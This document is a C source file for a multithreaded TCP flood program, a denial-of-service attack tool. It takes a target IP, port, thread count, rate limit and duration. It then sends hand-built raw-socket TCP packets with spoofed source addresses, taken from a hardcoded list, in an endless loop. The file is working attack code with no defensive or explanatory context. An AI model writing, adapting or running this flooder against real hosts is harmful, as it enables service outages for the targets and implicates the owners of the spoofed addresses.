#include <time.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <pthread.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <netdb.h>
#include <net/if.h>
#include <arpa/inet.h>
#define MAX_PACKET_SIZE 4096
#define PHI 0x9e3779b9
#define MAX_PAYLOAD_SIZE 1400
static unsigned long int Q[4096], c = 362436;
static unsigned int floodport;
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeptime = 100;

static const char PAYLOAD[] = "\x01\x01\x05\x0a\x7e\xb0\x53\x46\x7e\xb0\x53\x47\x0a\x7e\xb0\x53\x46\xb0\x53\x46\x7e\xb0\xb0\x53\x46\x7e\xb0\x53\x05\x0a\x7e\xb0";

void init_rand(unsigned long int x)
{
	int i;
	Q[0] = x;
	Q[1] = x + PHI;
	Q[2] = x + PHI + PHI;
	for (i = 3; i < 4096; i++)
	{
		Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
	}
}

unsigned long int rand_cmwc(void)
{
	unsigned long long int t, a = 18782LL;
	static unsigned long int i = 4095;
	unsigned long int x, r = 0xfffffffe;
	i = (i + 1) & 4095;
	t = a * Q[i] + c;
	c = (t >> 32);
	x = t + c;
	if (x < c)
	{
		x++;
		c++;
	}
	return (Q[i] = r - x);
}

int randnum(int min_num, int max_num)
{
	int result = 0, low_num = 0, hi_num = 0;

	if (min_num < max_num)
	{
		low_num = min_num;
		hi_num = max_num + 1;
	}
	else
	{
		low_num = max_num + 1;
		hi_num = min_num;
	}

	result = (rand_cmwc() % (hi_num - low_num)) + low_num;
	return result;
}

unsigned short csum(unsigned short *buf, int count)
{
	register unsigned long sum = 0;
	while (count > 1)
	{
		sum += *buf++;
		count -= 2;
	}

	if (count > 0)
	{
		sum += *(unsigned char *)buf;
	}

	while (sum >> 16)
	{
		sum = (sum & 0xffff) + (sum >> 16);
	}

	return (unsigned short)(~sum);
}

unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph, int pipisize)
{
	struct tcp_pseudo
	{
		unsigned long src_addr;
		unsigned long dst_addr;
		unsigned char zero;
		unsigned char proto;
		unsigned short length;
	}

	pseudohead;
	unsigned short total_len = iph->tot_len;
	pseudohead.src_addr = iph->saddr;
	pseudohead.dst_addr = iph->daddr;
	pseudohead.zero = 0;
	pseudohead.proto = IPPROTO_TCP;
	pseudohead.length = htons(sizeof(struct tcphdr) + pipisize);
	int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr) + pipisize;
	unsigned short *tcp = malloc(totaltcp_len);
	if (!tcp)
	{
		perror("malloc failed");
		exit(-1);
	}
	memcpy((unsigned char *)tcp, &pseudohead, sizeof(struct tcp_pseudo));
	memcpy((unsigned char *)tcp + sizeof(struct tcp_pseudo), (unsigned char *)tcph, sizeof(struct tcphdr) + pipisize);
	unsigned short output = csum(tcp, totaltcp_len);
	free(tcp);
	return output;
}

void setup_ip_header(struct iphdr *iph)
{
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(PAYLOAD) - 1;
	iph->id = htonl(54321);
	iph->frag_off = htons(0x4000);
	iph->ttl = MAXTTL;
	iph->protocol = IPPROTO_TCP;
	iph->check = 0;
	iph->saddr = inet_addr("127.0.0.1");
}

void setup_tcp_header(struct tcphdr *tcph)
{
	tcph->source = htons(5678);
	tcph->check = 0;
	tcph->ack = 1;
	tcph->psh = 1;
	tcph->ack_seq = randnum(10000, 99999);
	tcph->urg_ptr = 1;
	tcph->window = htons(64240);
	tcph->doff = (sizeof(struct tcphdr) + sizeof(PAYLOAD) - 1) / 4;
	memcpy((void *)tcph + sizeof(struct tcphdr), PAYLOAD, sizeof(PAYLOAD) - 1);
}

char *genPayload(char oldPayload[], size_t size)
{
	for (size_t i = 0; i < size; i++)
	{
		for (size_t num = 0; num < size / 2; num++)
		{
			oldPayload[num] = randnum(1, 128);
			oldPayload[i] = rand_cmwc() % oldPayload[num];
		}
	}

	return oldPayload;
}

void *flood(void *par1)
{
	char *td = (char *)par1;
	char datagram[MAX_PACKET_SIZE];
	struct iphdr *iph = (struct iphdr *)datagram;
	struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
	struct sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(floodport);
	sin.sin_addr.s_addr = inet_addr(td);
	int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
	if (s < 0)
	{
		perror("Could not open raw socket");
		exit(-1);
	}

	memset(datagram, 0, MAX_PACKET_SIZE);
	setup_ip_header(iph);
	setup_tcp_header(tcph);
	tcph->dest = htons(floodport);
	iph->daddr = sin.sin_addr.s_addr;
	iph->check = csum((unsigned short *)datagram, iph->tot_len);
	int tmp = 1;
	const int *val = &tmp;
	if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(tmp)) < 0)
	{
		perror("Error: setsockopt() - Cannot set HDRINCL");
		exit(-1);
	}

	int src_ips[] = {
		2890377736,
		2890340610,
		1746734953,
		1746841604,
		2890245379,
		136146180,
		2890227716,
		2890342170};

	init_rand(time(NULL));
	register unsigned int i;
	i = 0;
	while (1)
	{
		tcph->check = 0;
		tcph->seq = htonl(rand_cmwc() & 0xFFFFFFFFF);
		tcph->doff = ((sizeof(struct tcphdr)) + sizeof(PAYLOAD) - 1) / 4;
		tcph->dest = htons(floodport);
		iph->ttl = randnum(64, 128);
		iph->saddr = htonl(src_ips[rand_cmwc() % (sizeof(src_ips) / sizeof(src_ips[0]))]);
		iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
		iph->check = csum((unsigned short *)datagram, sizeof(struct iphdr));
		tcph->source = htons(rand_cmwc() & 0xFFFF);
		tcph->dest = htons(floodport);
		tcph->check = tcpcsum(iph, tcph, sizeof(PAYLOAD) - 1);

		if (sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
		{
			perror("Error: sendto failed");
		}

		int windows[3] = {8192, 64240, 65535};
		int ctos[3] = {0, 40, 72};
		iph->tos = ctos[randnum(0, 2)];
		char stronka[] = "\x01\x01\x05\x0a\x7e\xb0\x53\x46\x7e\xb0\x53\x47\x0a\x7e\xb0\x53\x46\xb0\x53\x46\x7e\xb0\xb0\x53\x46\x7e\xb0\x53\x05\x0a\x7e\xb0";
		tcph->window = htons(windows[randnum(0, 2)]);
		const char *newpayload = genPayload(stronka, sizeof(stronka) - 1);
		memcpy((void *)tcph + sizeof(struct tcphdr), newpayload, sizeof(newpayload) - 1);

		pps++;
		if (i >= limiter)
		{
			i = 0;
			usleep(sleeptime);
		}

		i++;
	}
}

int main(int argc, char *argv[])
{
	if (argc < 6)
	{
		fprintf(stderr, "Usage: %s <target IP> <port> <threads> <pps limiter, -1 for no limit> <time>\n", argv[0]);
		exit(-1);
	}

	fprintf(stdout, "Setting up Sockets...\n");
	int num_threads = atoi(argv[3]);
	floodport = atoi(argv[2]);
	int maxpps = atoi(argv[4]);
	limiter = 0;
	pps = 0;
	pthread_t thread[num_threads];
	int multiplier = 12;
	int i;

	for (i = 0; i < num_threads; i++)
	{
		if (pthread_create(&thread[i], NULL, &flood, (void *)argv[1]) != 0)
		{
			perror("Error: pthread_create failed");
			exit(-1);
		}
	}

	fprintf(stdout, "Starting Flood...\n");
	for (i = 0; i < (atoi(argv[5]) * multiplier); i++)
	{
		usleep((1000 / multiplier) * 1000);
		if ((pps * multiplier) > maxpps)
		{
			if (1 > limiter)
			{
				sleeptime += 100;
			}
			else
			{
				limiter--;
			}
		}
		else
		{
			limiter++;
			if (sleeptime > 25)
			{
				sleeptime -= 25;
			}
			else
			{
				sleeptime = 0;
			}
		}

		pps = 0;
	}

	return 0;
}
